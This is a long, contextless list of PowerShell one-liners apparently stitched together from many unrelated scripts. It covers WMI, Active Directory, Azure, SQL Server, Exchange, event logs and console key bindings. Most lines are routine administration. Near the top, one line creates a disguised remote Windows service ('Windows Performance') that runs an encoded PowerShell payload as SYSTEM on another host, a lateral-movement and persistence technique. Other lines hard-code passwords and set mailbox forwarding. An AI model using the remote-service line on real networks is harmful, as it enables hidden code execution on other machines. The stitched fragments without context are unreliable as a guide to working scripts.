Get-WmiObject -Class Win32_IP4RouteTable
Get-WmiObject -Namespace root\directory\ldap -Class ds_domain
Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | ? { $_ . ds_useraccountcontrol -eq 532480 }
Get-WmiObject -class Win32_GroupInDomain | ForEach-Object { [ wmi ] $_ . PartComponent }
ForEach-Object { if ( $_ . value -and $_ . name -notmatch "__" ) { @{ $( $_ . name ) = $( $_ . value ) } } }
Get-WmiObject -Class Win32_service -Filter 'Name = "WinPerf"'
Get-WmiObject -Class Win32_service -Filter 'Name = "WinPerf"' | Invoke-WmiMethod -Name StartService
Get-WmiObject -Class Win32_service -Filter 'Name = "WinPerf"' | Remove-WmiObject
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false , "Windows Performance" , $errorcontrol , $null , $null , "WinPerf" , "C:\Windows\System32\cmd.exe /c powershell -e <base64Encodedscript>" , $null , $servicetype , "Manual" , "NT Authority\System" , "" -ComputerName 192.168.1.1 -Credential $cred
Set-RemoteWMI -Username me -ComputerName 192.168.0.1 -Credential domain\admin
Get-WmiObject __eventFilter -Namespace root\subscription
Get-WmiObject __filtertoconsumerbinding -Namespace root\subscription
Import-Module cimsweep.psd1
Set-Item -LiteralPath $path -Value ( Read-Host -Prompt $description )
Set-Item -LiteralPath "Env:$variableKey" -Value ''
Write-SetVariable -Name $Name -Value $Value -Secret: $Secret
New-Object regex -ArgumentList "^$Pattern`$" , ( [ System.Text.RegularExpressions.RegexOptions ] :: IgnoreCase )
Get-PathIterator -Path $pathPrefix -Filter $fileNameFilter -IncludeFiles: $IncludeFiles -IncludeDirectories: $IncludeDirectories -Force: $Force |
New-Object psobject -Property @{ Token = ';' ; Replacement = '%3B' }
Assert-Agent -Minimum '2.105.7'
Assert-Agent -Minimum '2.122.0'
Export-ModuleMember -Function @(
set-location hkcu:\ #change to the HKEY_CURRENT_USER hive
get-permission
Read-Host
random-number
Hal-Mary $reply
Read-Host
Clear-Board
add-type -assemblyname system.speech ;
rundll32.exe user32.dll , LockWorkStation ;
add-type -AssemblyName System.Windows.Forms
Start-Process -FilePath "chrome" ;
start-sleep 2
Set-Clipboard -Value $url
start-sleep 2
New-PSNotebook -NoteBookName $OutputNotebookName -DotNetInteractive {
Get-EventLog -ComputerName ( Get-ADComputer -Filter 'Name -like "serverName*"' | Select-Object -ExpandProperty Name |
Get-EventLog -Logname System -Newest 5 |
Get-WinEvent -LogName Microsoft-Windows-FailoverClustering/Operational | Where-Object -FilterScript { $_ . Message -like "*serverName*" }
Get-Service -ComputerName ( Get-Content .\computers.txt ) | Select-Object -Property MachineName , ServiceName , Status | Sort-Object -Property MachineName
Get-ADComputer –Filter * | Select @{ n = 'ComputerName' ; e = { $PSItem . Name } } | Get-Service –Name *
Get-ADComputer -Filter * | Select-Object -ExpandProperty Name | foreach { Set-Service -ComputerName $_ -Name WinRM -StartupType Automatic -Confirm: $false -Verbose }
Get-Service | Format-Table –GroupBy Status
Get-WmiObject –Class Win32_Service –Filter "Name='MyService'" | ForEach-Object { $PSItem . Change ( $null , $null , $null , $null , $null , $null , $null , "P@ssw0rd" ) }
Invoke-Command -ComputerName $DaComp -ScriptBlock { quser }
Invoke-Command -ComputerName $DaComp -ScriptBlock { WMIC BIOS GET SERIALNUMBER }
Get-RegexMatchResultList -String $String -Pattern $pattern | ForEach-Object {
New-ProjectConfigDirs -Name $Module . Name . ToLower ( )
New-Item -Path $path -ItemType Directory
Import-module activedirectory
Send-EasyMail -subject "Test Subject" -body "Testing some body text."
Get-Counter -ComputerName $env:COMPUTERNAME -ListSet 'MSSQL$SQL2012*' |
Get-Counter -ListSet 'MSSQL$SQL2012:Buffer Manager' |
Get-WmiObject -ComputerName "PragmaticWorks" -Query $wmiQuery |
Get-EventLog -List
Get-WinEvent -ListLog * | Format-Table -Autosize
Get-EventLog System |
Get-EventLog Application -Newest 20 | Format-List
Get-EventLog Application |
New-EventLog -LogName Application -Source MyCoolPowerShellScript
Write-EventLog -LogName Application ` -Source MyCoolPowerShellScript ` -EventId 0001 ` -Message "I have something to say" ` -EntryType Information
Write-EventLog -LogName Application ` -Source MyCoolPowerShellScript ` -EventId 0002 ` -Message "You're doing it wrong" ` -EntryType Error
Write-EventLog -LogName Application ` -Source MyCoolPowerShellScript ` -EventId 0003 ` -Message "I'm The Doctor. Basically, run." ` -EntryType Warning
Get-Disk
Get-Pro + < tab> + < ENTER> = get-pro
Set-ExecutionPolicy Unrestricted
Find-Package
Stop-Service -Name 'MSSQL$MENHAJSQLDEV'
Get-EventLog -List
Get-eventlog -Logname system -EntryType error -Newest 5
get-help *csv*
Get-Service | Export-CSV -Path c:\systeminfo.txt -NoTypeInformation
Get-Service | Convertto-CSV -NoTypeInformation | Out-file c:\scripts\dg\SysError2.txt
Get-Process | Export-clixml -Path c:\xmlpr.xml
Get-EventLog -LogName System -Newest 5 -EntryType error | convertto-html -Title "WINSERVER11 Erros" -Body ( Get-Date ) -PreContent "<p> Generated by IT</p>" -PostContent "Please contact SysAdim for more info" | Out-File c:\errlog.txt
Get-Process | Select-Object -Property Name , CUP
Get-Service | Sort-Object -Property Status | Select-Object -Property Name
Get-WmiObject -Class Win32_logicaldisk -Filter "DeviceID='c:'"
Get-WmiObject -Class Win32_logicaldisk -Filter "DeviceID ='c:'" | Select-Object -Property DeviceID , @{ name = "DiskDrive" ; Expression = { $_ . Freespace / 1gb -AS [ INT ] } }
Get-Service -name BITS | ForEach-Object { $_ . start ( ) }
Import-module "sqlps" -DisableNameChecking
Import-Module SQLPS -DisableNameChecking
Set-location SQLSERVER:\SQL\SQL2016\DFAULT\DATABASES
Restore-SqlDatabase -ServerInstance [computer\instance] -Database [database name] -Backupfile [sql server backupfile]
Get-WindowsFeature *GUI* | install-windowsfeature
New-AzureRmResourceGroup ` -ResourceGroupName $resourcegroup ` -Location $location
Add-AzureRmLoadBalancerProbeConfig -Name myHealthProbe ` -LoadBalancer $lb ` -Protocol tcp ` -Port 80 ` -IntervalInSeconds 15 ` -ProbeCount 2
Add-AzureRmLoadBalancerRuleConfig ` -Name myLoadBalancerRule ` -LoadBalancer $lb ` -FrontendIpConfiguration $lb . FrontendIpConfigurations [ 0 ] ` -BackendAddressPool $lb . BackendAddressPools [ 0 ] ` -Protocol Tcp ` -FrontendPort 80 ` -BackendPort 80
Set-AzureRmLoadBalancer -LoadBalancer $lb
Set-AzureRmVmssStorageProfile $vmssConfig ` -ImageReferencePublisher MicrosoftWindowsServer ` -ImageReferenceOffer WindowsServer ` -ImageReferenceSku 2016-Datacenter ` -ImageReferenceVersion latest ` -OsDiskCreateOption FromImage
Set-AzureRmVmssOsProfile $vmssConfig ` -AdminUsername azureuser ` -AdminPassword P@ssword! ` -ComputerNamePrefix myVM
Add-AzureRmVmssNetworkInterfaceConfiguration ` -VirtualMachineScaleSet $vmssConfig ` -Name "network-config" ` -Primary $true ` -IPConfiguration $ipConfig
New-AzureRmVmss ` -ResourceGroupName $resourcegroup ` -Name $vmssname ` -VirtualMachineScaleSet $vmssConfig
New-Item myfile.txt
Remove-Item myfile.txt
Set-PSDebug -Trace 0
Set-Alias is-exist test-path
Set-Alias isdir is-Directory
Add-Content $pathToNewScript "objNet.AddWindowsPrinterConnection ""$defaultPrinter"""
Show-Menu $compName $countTitles $arrayOfTitles
Set-Alias -name .. -value CD1
Set-Alias -name goto -value go
Set-Alias -name web -value WEBDEV
Set-Alias -Name byeOneDrive -value NoneDrive
Set-Alias -Name block -value InternetBlock
Set-Alias -Name refresh -value RefreshProfile
Get-ComputerInfo
Get-NetIPConfiguration | Select-Object IPv6LinkLocalAddress
Get-NetIPv6Protocol
Set-NetIPv6Protocol -RandomizeIdentifiers Disabled
Get-NetIPv6Protocol
Set-NetIPv6Protocol -RandomizeIdentifiers Enabled
Initialize-Disk -Number 1 -PartitionStyle MBR
New-Partition -DiskNumber 1 -DriveLetter L -IsActive -Size 5GB
Format-Volume -DriveLetter L -Filesystem NTFS
Resize-Partition -DriveLetter L -Size 10GB
Remove-Partition -DriveLetter L
Get-Partition
Set-Partition -DiskNumber 0 1
Set-DnsClientServerAddress -InterfaceIndex 4 -ServerAddresses ( "192.168.0.1" , "192.168.0.10" )
Get-DnsClientServerAddress -InterfaceIndex 4
Set-DnsClientServerAddress -InterfaceIndex 4 -ResetServerAddresses
Add-Computer -DomainName $domain -Credential $credentials
Restart-Computer
Get-ADUser -Filter "samAccountName -eq 'SampleS'"
Get-ADUser -Filter "Surname -eq 'Sample'" | Format-Table Surname , GivenName , samAccountName
Remove-Aduser username -Confirm: $False # Delete the username without confirmation
Set-NetFirewallRule FPS-ICMP4-ERQ-In -Enabled False
New-SmbShare @Parameters
Get-ChildItem C:\Users\ -directory
New-Item textfile.txt
Get-Verb -verb stop
Copy-Item "$installPath\pt.bat" .
Remove-Item "pt.bat"
Remove-Item -Recurse -Force $zipFile
Get-Content $referencesFilePath | ForEach-Object { $_ -replace $fileNamePattern , $newFileName } > $referencesTempFilePath
Copy-Item $referencesTempFilePath $referencesFilePath -Force
Get-Content $referencesFilePath | ForEach-Object { if ( -not ( $_ -match $fileNamePattern ) ) { $_ } } > $referencesTempFilePath
AddOrUpdate-Reference $scriptsFolderProjectItem $juiFileNameRegEx $juiFileName
Get-Content $referencesFilePath | ForEach-Object { $_ -replace $fileNamePattern , $newFileName } > $referencesTempFilePath
Copy-Item $referencesTempFilePath $referencesFilePath -Force
Get-Content $referencesFilePath | ForEach-Object { if ( -not ( $_ -match $fileNamePattern ) ) { $_ } } > $referencesTempFilePath
AddOrUpdate-Reference $scriptsFolderProjectItem $jqueryFileNameRegEx $jqueryFileName
Delete-ProjectItem $intelliSenseFileProjectItem
Present-PowerShellAndSQL
Get-Help
Get-Help -ShowWindow
Get-Help Get-Member
Get-Help about_Variables -ShowWindow
Get-Help about*
Get-Help Get-Command -Examples
Get-Help Get-Command -Online
Get-Command *sql*
Get-Command -Name *sql*
Show-Command Get-Command
Get-Command -Noun Module
Get-Module -ListAvailable
Get-Module
Get-PSProvider
Get-ChildItem HKCU:\Console
Get-Module -ListAvailable -Name *SQL* | Out-GridView
Import-Module SQLPS
Set-Location "C:"
Import-Module -Verbose -FullyQualifiedName "C:\Program Files (x86)\Microsoft SQL Server\130\Tools\PowerShell\Modules\SQLPS"
Get-Module
Import-Module SQLServer
Compare-Object -ReferenceObject $SQLPSCommands -DifferenceObject $SQLServerCommands
Add-Type -Path "C:\Program Files\Microsoft SQL Server\130\SDK\Assemblies\Microsoft.SqlServer.Smo.dll"
Backup-SqlDatabase -Database db1 -ServerInstance DGEM -BackupFile "D:\SQLBackup\db1_$(get-date -f yyyy-MM-dd-hh-mm-ss).bak"
Get-PSProvider
Set-Location SQLSERVER:
Get-ChildItem $scriptfolder | Remove-Item
Import-Module -Verbose -FullyQualifiedName "C:\Program Files (x86)\Microsoft SQL Server\130\Tools\PowerShell\Modules\SQLPS"
Send-MailMessage ` -SmtpServer "DGEM" ` -To "administrator@davepc" ` -From "powershell@davepc" ` -Subject "Error Log - $timestamp" ` -Body "Recent Login Errors: $errorList" #`
Get-EventLog -LogName Application -Newest 100
Invoke-Sqlcmd -ServerInstance DGEM -Database AdventureWorks2014 -Query "SELECT TOP 100 [ProductID] ,[Name] ,[StandardCost] ,[ListPrice] ,[ModifiedDate] FROM [AdventureWorks2014].[Production].[Product]"
Find-Module -Name dbatools
Update-dbatools
Update-SqlWhoIsActive
Show-SqlWhoIsActive -SqlServer .
Get-Command -Module DBATools -Verb Get
Export-SqlLogin -ServerInstance . -FilePath c:\temp\logins.sql
Find-SqlDuplicateIndex -SqlServer . -FilePath c:\temp\duplicateindexes.sql
Add-Type -Path "C:\Program Files\Microsoft SQL Server\130\SDK\Assemblies\Microsoft.SqlServer.Smo.dll"
Remove-Module "SQLPS"
Get-PSProvider
Import-Module SQLPS
Import-Module sqlps -DisableNameChecking
Get-PSProvider
Remove-Module "SQLPS"
Get-PSProvider
Get-Command -CommandType Cmdlet -Module SQLPS , SQLASCMDLETS | Select Name , Module |
Get-Module
Get-Module -ListAvailable | Select-Object Name
Get-Alias cd
Remove-Item -Path C:\MyScripts
New-Item -type directory -Path c:\MyScripts
Set-Location C:\MyScripts
Get-Alias
Start-Transcript C:\MyScripts\transcript0.txt
Update-Help
Get-Module -ListAvailable -Name *SQL*
Get-Module
Remove-Module -Name SQLPS
Get-Command -Module PowerShellGet
Get-Module -Name SQLServer | Select-Object -ExpandProperty ModuleBase -First 1
Get-Command -Module SQLServer -Verb Get
Get-SQLAgentJob -ServerInstance . -Name 'Test Job' | Get-Member
Get-Variable
Set-Location -Path SQLSERVER:
Get-ChildItem
Set-Location -Path SQLSERVER:\SQL\
Set-Location -Path .\DEFAULT
Get-ChildItem
Get-ChildItem -Path .\Databases\AdventureWorks2014
Get-ChildItem -Path .\Databases\AdventureWorks2014\Tables\HumanResources.Employee
Get-ChildItem -Path .\JobServer
Stop-Service SQLBrowser
Get-Command
Get-Command Write-*
Get-Help Get-Command | more
Get-Help Get-Command
Get-Help Get-Command -Examples | more
Get-Help about_*
Get-Command *-Item
Set-Location .\Software #Equivalent of cd or change directory
Set-Location C:\MyScripts
Get-ChildItem Function:\
Get-Service ` | Format-Table name , ServiceType , status , CanStop , -auto
Get-Service ` | Out-GridView
Get-Command Get-*
Get-Command *-EventLog
Get-EventLog -LogName Application
Get-EventLog -LogName Application -Newest 10
Get-EventLog -LogName Application -Newest 10 -EntryType Error
Get-Help Get-EventLog -Parameter entrytype
Get-EventLog -LogName Application -Newest 10 -EntryType Error , Warning
Get-Command *CSV
Invoke-Item C:\MyScripts\appevents.csv
Get-Process | Get-Member
Get-Process | Select-Object *
Get-Command Out-*
Get-Process | Select-Object * | Out-GridView
Start-Process notepad
Get-Process -Name notepad
Stop-Process notepad #doesn't work, needs a Process object
Get-Process | Get-Member
Get-Process -Name notepad | Stop-Process
Get-Process -Name notepad
Send-MailMessage ` -SmtpServer "davepc" ` -To "administrator@davepc" ` -From "powershell@davepc" ` -Subject "Error Log - $timestamp" ` -Body "Recent Login Errors" ` -Attachments $filename
Set-Location C:\scripts
Get-Command *-Object
Get-Command -Noun Object
Get-Command *-EventLog
Get-Command -Name *WMI* -CommandType Cmdlet
Get-Command -Name *CIM* -CommandType Cmdlet
Get-Help about_Hash_Tables
Set-ExecutionPolicy RemoteSigned
Invoke-Sqlcmd -HostName $sqlinstance -Query $blitzscript
Invoke-Sqlcmd -HostName $sqlinstance -Query "sp_blitz" ` | Export-Csv -path $reportpath -noTypeInformation
Set-Location SQLSERVER:\SQL\davepc\sql2012dev
Get-ChildItem Env:\
Invoke-WebRequest -Uri http://40.79.68.121 #change to correct IP
Get-ComputerGeoLocation
Get-Location
Invoke-Sqlcmd "ALTER DATABASE $db SET SINGLE_USER WITH ROLLBACK AFTER 10" -SuppressProviderContextWarning
Import-Module 'sqlps' -DisableNameChecking
Invoke-Sqlcmd2 $s $command -QueryTimeout 0 ## 20 minutes to restore?
Invoke-WebRequest http://dave-aws-site-ff.s3.amazonaws.com/
Invoke-WebRequest http://dave-aws-site-ff.s3-website.us-east-2.amazonaws.com/
Invoke-WebRequest http://dave-aws-site-ff.s3.amazonaws.com/index.html
Invoke-WebRequest http://dave-aws-site-ff.s3.amazonaws.com
Invoke-WebRequest http://dave-aws-site-ff.s3-website.us-east-2.amazonaws.com/
Invoke-WebRequest http://dave-aws-site-ff.s3-website.us-east-2.amazonaws.com/index.html
Invoke-Expression "`$resultObject = $nodePath"
ssh-keygen -t rsa -b 2048
Get-ChildItem env:\k*
env:\k*
Robocopy.exe $driver_path $target_folder /E
pnputil.exe -a $inf
Stop-Service -InputObject $PrintSpooler
Remove-PrinterDriver -Name $selected_item . Name
Get-CimInstance @GetCimInstanceParams | ForEach-Object -Process {
echo-header
push-location $projectdir
pop-location
Edit-ProjectNotes $ProjectName
Edit-ProjectTasks $ProjectName
Rename-Project $ProjectName
Remove-Project $ProjectName
New-Project
Register-ArgumentCompleter -Native -CommandName dotnet -ScriptBlock {
Set-PSReadLineKeyHandler -Key UpArrow -Function HistorySearchBackward
Set-PSReadLineKeyHandler -Key F7 ` -BriefDescription History ` -LongDescription 'Show command history' ` -ScriptBlock {
Set-PSReadLineKeyHandler -Chord 'Ctrl+d,Ctrl+c' -Function CaptureScreen
Set-PSReadLineKeyHandler -Key Alt+d -Function ShellKillWord
Set-PSReadLineKeyHandler -Key Alt+w ` -BriefDescription SaveInHistory ` -LongDescription "Save current line in history but do not execute" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key Ctrl+V ` -BriefDescription PasteAsHereString ` -LongDescription "Paste the clipboard text as a here string" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key 'Alt+(' ` -BriefDescription ParenthesizeSelection ` -LongDescription "Put parenthesis around the selection or entire line and move the cursor to after the closing parenthesis" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key "Alt+'" ` -BriefDescription ToggleQuoteArgument ` -LongDescription "Toggle quotes on the argument under the cursor" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key "Alt+%" ` -BriefDescription ExpandAliases ` -LongDescription "Replace all aliases with the full command" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key F1 ` -BriefDescription CommandHelp ` -LongDescription "Open the help window for the current command" ` -ScriptBlock {
Set-PSReadLineOption -CommandValidationHandler {
Set-PSReadLineKeyHandler -Key RightArrow ` -BriefDescription ForwardCharAndAcceptNextSuggestionWord ` -LongDescription "Move cursor one character to the right in the current editing line and accept the next word in suggestion when it's at the end of current editing line" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key Alt+a ` -BriefDescription SelectCommandArguments ` -LongDescription "Set current selection to next command argument in the command line. Use of digit argument selects argument by position" ` -ScriptBlock {
Set-PSReadLineKeyHandler -Key Ctrl+Shift+b ` -BriefDescription BuildCurrentDirectory ` -LongDescription "Build the current directory" ` -ScriptBlock {
Add-PodeRoute -Path "/" -Method "GET" -ScriptBlock {
Add-Type -assembly System.Drawing # добавить сборку для подключения иконок
Add-Type -assembly System.Windows.Forms # подключить сборку формы .NET
Add-Type -AssemblyName System.Web
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
start-sleep -s 10
Import-Module posh-git
ssh-add
Invoke-Selections -Selections $Selections -SelAction $SelAction -Show-Command ${Show-Command} -Instances $Selection . instances
Add-Type @" using System; using System.Runtime.InteropServices; public class ForeGroundWindowSeer { [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); } "@
Start-Sleep -Milliseconds 10
Set-WindowStyle -MainWindowHandle $( Get-Process | ? { $_ . MainWindowTitle -like "*launcher_shortcut" -and $_ . ProcessName -eq "cmd" } ) . MainWindowHandle -Style HIDE
Add-LabelToForm $Form $( $temp_Y_axis + 55 ) ""
Get-process | Where name -ne "*powershell*" | Sort -property Pm -Descending
Invoke-WebRequest -Uri $URLPath -OutFile "C:\TempPath\PrinterInstallerClient.msi"
New-Item -Path $nevins_defender_root_dir -ItemType Directory | Out-Null ## Mute output (silent).
New-Item -Path $nevins_defender_service_dir -ItemType Directory | Out-Null ## Mute output (silent).
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled | Out-File -FilePath "C:\NevinsDefender\Services\settings_RealTimeProtectionEnabled.txt"
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled | Out-File -FilePath "C:\NevinsDefender\Services\settings_AntivirusEnabled.txt"
Get-MpComputerStatus | Select-Object AntispywareEnabled | Out-File -FilePath "C:\NevinsDefender\Services\settings_AntispywareEnabled.txt"
Get-MpComputerStatus | Select-Object AMServiceEnabled | Out-File -FilePath "C:\NevinsDefender\Services\settings_AMServiceEnabled.txt"
Get-MpComputerStatus | Select-Object BehaviorMonitorEnabled | Out-File -FilePath "C:\NevinsDefender\Services\settings_BehaviorMonitorEnabled.txt"
Remove-Item -Path C:\NevinsDefender\Services\* -Include settings_*.txt -Force
New-Item $defender_log_dir\$log_syntax.txt | Out-Null ## Create log file.
Add-Content $defender_log_dir\$log_syntax.txt "#"
Set-Content -LiteralPath $filePath -Value $minecraftCommandAllText
Set-Content -Path $TP . Commands -Value $Lines
Export-ModuleMember -function Copy-BlobItem , Get-BlobChildItem
ConvertTo-Batch -Command ( Get-Content .\Test-ForAdmin.ps1 -Raw ) -BatchEnvVarName IS_RUNNING_AS_ADMIN | clip
Get-Childitem $PSScriptRoot\functions\*.ps1 -Exclude dev.ps1 |
Register-ArgumentCompleter -CommandName Get-Calendar , Show-Calendar , Get-NCalendar -ParameterName Month -ScriptBlock {
Register-ArgumentCompleter -CommandName Get-Calendar , Show-Calendar , Get-NCalendar -ParameterName Year -ScriptBlock {
Register-ArgumentCompleter -CommandName Show-GuiCalendar -ParameterName BackgroundColor -ScriptBlock {
Add-Type -path $PSScriptRoot\Module\PSChocolatey\bin\x86\PSChocolatey.dll
Export-ModuleMember -function *-* -Alias *
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
Get-ADGroupMember -Identity ADGROUP | Select-Object name , SamAccountname | Format-Table -AutoSize
Get-ADGroupMember ADGROUP | Where-Object { $_ . name -match "USER*" } | Select-Object name , SamAccountname | Format-Table -AutoSize
Get-ADGroup ADGROUP
Get-ADUser $ad -Properties LockedOut | Select-Object LockedOut
Get-ADUser -f { name -like "USER*" }
Get-ADGroup -Filter * | Where-Object { -not ( $_ | Get-ADGroupMember ) } | Select-Object name
Install-Module Az
Get-AzSubscription
Get-AzSubscription -TenantId "TENANT_ID"
Select-AzSubscription -SubscriptionID "SUBSCRIPTION_ID"
Get-AzResourceGroup
Get-AzResourceGroup -Name "NAME_RG"
Get-AzResourceGroup | where ResourceGroupName -like NAME*
Get-AzResourceGroup | sort Location , ResourceGroupName | Format-Table -GroupBy Location ResourceGroupName , ProvisionState , Tags
Get-AzResource ResourceGroupName "NAME_RG"
Get-AzResource -ResourceType
New-AzResourceGroup -Name "NEW_RG" -Location "LOCATION"
Remove-AzResourceGroup -Name "RG_TO_DELETE"
Set-AzResourceGroup -Name EXAMPLE_GROUP -tag @{ Dept = "IT" ; Environment = "Test" }
Set-AzResourceGroup -Tag @{ } -Name RESOURCE_GROUP
Get-AzPolicyDefinition
New-AzResourceLock -LockLevel ReadOnly -LockNotes "NOTES ABOUT LOCK" -LockName "SL-WEBLOCK" -ResourceName "RESOURCE_NAME" -ResourceType "microsoft.web/sites"
Get-AzResourceLock -LockName "NAME_LOCK" -ResourceName "RESOURCE_NAME" -ResourceType "microsoft.web/sites" -ResourceGroupName "RG_NAME"
Get-AzStorageAccount
New-AzStorageAccount -ResourceGroupName "RG_NAME" -Name "STORAGE_NAME" -Location "LOCATION" -SkuName "SKU_OPTION"
New-AzStorageContainer -ResourceGroupName "RG_NAME" -AccountName "STORAGE_ACCT" -ContainerName "CONTAINER_NAME"
Remove-AzStorageAccount -ResourceGroupName "RG_NAME" -AccountName "STORAGE_ACCT"
Remove-AzStorageContainer -ResourceGroupName "RG_NAME" -AccountName "STORAGE_ACCT" -ContainerName "CONTAINER_NAME"
Get-AzVM
Get-AzVM -ResourceGroupName "RG_NAME" -Name "VM_NAME"
New-AzVM -Name "VM_NAME"
Start-AzVM -ResourceGroupName "RG_NAME" -Name "VM_NAME"
Get-AzVirtualNetwork -ResourceGroupName "RG_NAME"
Get-AZVirtualNetwork -Name "VNET_NAME" -ResourceGroupName "RG_NAME"
Get-AZVirtualNetwork -Name "VNET_NAME" -ResourceGroupName "RG_NAME" | select subnets
Get-AzPublicIpAddress -ResourceGroupName "RG_NAME"
Get-AzLoadBalancer -ResourceGroupName "RG_NAME"
Get-AzNetworkInterface -ResourceGroupName "RG_NAME"
Get-AzNetworkInterface -Name "NIC_NAME" -ResourceGroupName "RG_NAME"
Test-AzDnsAvailability -DomainNameLabel "DNS_NAME" -Location $location
Remove-AzVirtualNetwork -Name "VNET_NAME" -ResourceGroupName "RG_NAME"
Remove-AzNetworkInterface -Name "NIC_NAME" -ResourceGroupName "RG_NAME"
Remove-AzLoadBalancer -Name "LB_NAME" -ResourceGroupName "RG_NAME"
Remove-AzPublicIpAddress -Name "PIP_NAME" -ResourceGroupName "RG_NAME"
Get-AzureADUser
New-AzRoleAssignment -ResourceGroupName "RG_NAME" -ObjectId "XXXXXXXXXX" -RoleDefinitionName ROLE
Get-AzRoleAssignment -ResourceGroupName "RG_NAME" -ObjectId "XXXXXXXXXX"
Add-MailboxPermission -Identity $MBX -User $User -AccessRights FullAccess -AutoMapping $True -Confirm: $False
Remove-MailboxPermission -Identity $MBX -User $User -AccessRights FullAccess -InheritanceType All -confirm: $False
Add-MailboxPermission -Identity $MBX -User $User -AccessRights FullAccess -AutoMapping $False -Confirm: $False
Add-MailboxPermission -Identity $mbox -User $User -AccessRights FullAccess -AutoMapping $True -Confirm: $False
Add-MailboxPermission -Identity $MBX -User $USR -AccessRights FullAccess -AutoMapping $True -Confirm: $False
Disable-InboxRule -Identity "RULE NAME" -mailbox shared@domain.com
get-module -name MODULE -ListAvailable | ForEach-Object { $_ . ExportedCommands . Values }
Connect-MsolService
Remove-Item env:\CONDA_DEFAULT_ENV
Start-Process -Credential $creds cmd /c "net session"
Set-StrictMode -Version 3.0
Set-Variable -Name listPosn -Value 0 -Scope 1
Set-Variable -Name listItems -Value $null -Scope 1
Import-Csv -Path $Module . CustomHotstringsFilePath | ForEach-Object { $hotstrings . $( $_ . Name ) = $_ . Definition }
Set-PSReadLineKeyHandler -Chord 'Shift+SpaceBar' -ScriptBlock { [ Microsoft.PowerShell.PSConsoleReadLine ] :: Insert ( ' ' ) } -BriefDescription $Module . Name -Description 'Hotstrings: suppress expansion of a defined hotstring.'
Get-ChildItem -Path "$PSScriptRoot\Public" -Filter "*.ps1" | ForEach-Object {
Import-Module $DLLPath
Set-PSReadLineKeyHandler -Key "Ctrl+Shift+*" ` -BriefDescription "AddFavorite" ` -LongDescription "Add the current command to the favorites list" ` -ScriptBlock {
Optimize-PSFavorites
Get-ADTrusts $DomainName "Domain"
Get-ADTrusts $null "Forest"
Import-Module ActiveDirectory
Add-Content -Path $LogFile -Value $( "## Not Unique: " ` + "sAMAccountName $NewName not unique in domain" )
Add-Content -Path $LogFile -Value $( "## OK: " ` + "sAMAccountName $NewName already in correct format" )
Add-Content -Path $LogFile -Value $( "## Missing Values: Attributes missing" )
Add-Content -Path $LogFile -Value $( "## Not Unique (Second Attempt): " ` + " sAMAccountName $NewName not unique in domain" )
Add-Totals
Set-Mailbox -Identity $mailbox . SamAccountName -ForwardingAddress $ForwardingAddress -DeliverToMailboxAndForward $true
Add-Type -TypeDefinition @" using System.Collections; namespace HealthChecker { public class HealthExchangeServerObject { public string ServerName; //String of the server that we are working with public HardwareObject HardwareInfo; // Hardware Object Information public OperatingSystemObject OSVersion; // OS Version Object Information public NetVersionObject NetVersionInfo; //.net Framework object information public ExchangeInformationObject ExchangeInformation; //Detailed Exchange Information public string HealthCheckerVersion; //To determine the version of the script on the object. } public class ExchangeInformationObject { public ServerRole ExServerRole; // Roles that are currently installed - Exchange 2013 makes a note if both roles aren't installed public ExchangeVersion ExchangeVersion; //Exchange Version (Exchange 2010
Import-Module $env:ExchangeInstallPath\bin\Exchange.ps1 -ErrorAction Stop
Write-VerboseOutput ( "getting the total number of cores in the processor(s)" )
Write-Grey ( "" )
Write-VerboseOutput ( "Remote NDSI Compatible Device found. Ignoring NIC." )
Write-Red ( "`tHyper-Threading Enabled: Yes --- Error: Having Hyper-Threading enabled goes against best practices. Please disable as soon as possible." )
Write-Red ( "Failed to collect data from your DC servers in site {0}." -f $ADSite )
Get-HybridApplication -appId $appId -credential $credential
Get-MsolAccountSku | out-gridview
import-csv $path | foreach {
import-csv $path | Get-MSOLUser | out-gridview
Search-AD -Filter '(&(objectClass=msRTCSIP-TrustedServer))' ` -Properties 'msrtcsip-trustedserverfqdn' , Name ` -SearchRoot $OCSADContainer |
Search-AD -Filter '(&(objectClass=msRTCSIP-EdgeProxy))' ` -Properties cn , Name , 'msrtcsip-edgeproxyfqdn' ` -SearchRoot $OCSADContainer |
Search-AD -Filter '(&(objectClass=msRTCSIP-GlobalTopologySetting))' ` -Properties cn , Name , 'msrtcsip-backendserver' ` -SearchRoot $OCSADContainer |
New-SelfContainedAssetReport ` -ReportContainer $ADForestReport ` -ReportNamePrefix 'forest_' ` @reportsplat
New-SelfContainedAssetReport ` -ReportContainer $ADDomainReport ` -ReportNamePrefix 'domain_' ` @reportsplat
Import-Module -Name $Destination\PsGet
Get-Module -Name $Module -ListAvailable | foreach {
Add-PathToPSModulePath -PathToAdd: $Destination -PersistEnvironment: $PersistEnvironment -Global: $Global
Set-Alias -Name inmo -Value Install-Module #Obsolete
Set-Alias -Name ismo -Value Install-Module
Install-Module -ModulePath $here\TestModules\HelloWorldFolderWithChildModules.zip -Verbose: $verbose
Install-Module -ModuleName HelloWorld -ModuleUrl https://github.com/psget/psget/raw/master/TestModules/HelloWorldInChildFolder.zip -ModuleHash 722377BA6AE291B6109C7ECEBE5E2B0745B46A070238F7D05FC0DCA68F8BAD03 -DoNotImport -Verbose: $verbose
Set-Content -Path $userModulePath\HelloWorld\extrafile.txt -Value ExtraContent
Import-Module ( $here + "\PsGet\PsGet.psm1" ) -Force
Remove-Item $Path\packages\ -Recurse -Force -ErrorAction Continue
Copy-Item $OtherFolders -Recurse -Destination $ReleasePath
Get-ChildItem $SourcePath -File |
Trace-Message " Copying Module Source"
Trace-Message " Update Module Version"
Trace-Message "Sending CI Code-Coverage Results" -Verbose: ( ! $Quiet )
Trace-Message "BUILDING: $ModuleName in $Path" -Stopwatch $TraceVerboseTimer
Add-Content .gitignore $change . Name
Set-Content SourceOne.ps1 ( Get-Date )
